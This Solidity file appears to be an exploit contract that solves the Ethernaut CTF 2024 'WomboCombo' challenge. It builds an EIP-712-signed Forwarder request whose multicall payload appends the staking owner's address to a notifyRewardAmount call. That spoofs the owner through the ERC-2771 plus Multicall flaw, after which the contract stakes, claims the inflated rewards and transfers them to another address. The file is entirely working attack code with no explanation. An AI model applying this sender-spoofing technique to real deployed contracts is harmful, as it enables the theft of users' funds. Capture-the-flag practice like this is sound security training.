// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "src/EthernautCTF_2024/WomboCombo/Challenge.sol";
import {Multicall} from "@openzeppelin/contracts/utils/Multicall.sol";
import "forge-std/console2.sol";

contract WomboComboAttack {
    Staking staking;
    Forwarder forwarder;
    Token stk;
    Token rwd;
    Forwarder.ForwardRequest req;
    bytes32 public message;

    constructor(Challenge challenge) payable {
        staking = challenge.staking();
        forwarder = challenge.forwarder();
        stk = staking.stakingToken();
        rwd = staking.rewardsToken();
    }

    function constructCalldata() public {
        bytes memory notifyRewardAmountData = abi.encodeWithSelector(Staking.notifyRewardAmount.selector, rwd.balanceOf(address(staking)));
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodePacked(notifyRewardAmountData, staking.owner());
        bytes memory multicallData = abi.encodeWithSelector(Multicall.multicall.selector, data);
        
        req = Forwarder.ForwardRequest({
            from: msg.sender,
            to: address(staking),
            value: 0,
            gas: 5e6,
            nonce: 0,
            deadline: 0,
            data: multicallData
        });
    }

    function constructMessage() public {
        bytes32 hashedName = keccak256(bytes("Forwarder"));
        bytes32 hashedVersion = keccak256(bytes("1"));
        bytes32 typeHash = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
        bytes32 domainSeparatorV4 = _buildDomainSeparator(typeHash, hashedName, hashedVersion, address(forwarder));
        bytes32 _FORWARDREQUEST_TYPEHASH = keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)");
        bytes32 structHash = keccak256(
                        abi.encode(
                            _FORWARDREQUEST_TYPEHASH,
                            req.from,
                            req.to,
                            req.value,
                            req.gas,
                            req.nonce,
                            req.deadline,
                            keccak256(req.data)
                        )
                    );
        message = toTypedDataHash(domainSeparatorV4, structHash);
    }

    function attack(bytes memory signature) public {
        forwarder.execute(req, signature);
        stk.approve(address(staking), type(uint256).max);
        staking.stake(100 ether);
    }

    function solve() public {
        staking.getReward();
        console2.log("reward", rwd.balanceOf(address(this))/(1 ether));
        rwd.transfer(address(0x123), rwd.balanceOf(address(this)));
    }

    function _buildDomainSeparator(
        bytes32 typeHash,
        bytes32 nameHash,
        bytes32 versionHash,
        address _forwarder
    ) private view returns (bytes32) {
        return keccak256(abi.encode(typeHash, nameHash, versionHash, block.chainid, address(_forwarder)));
    }

    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}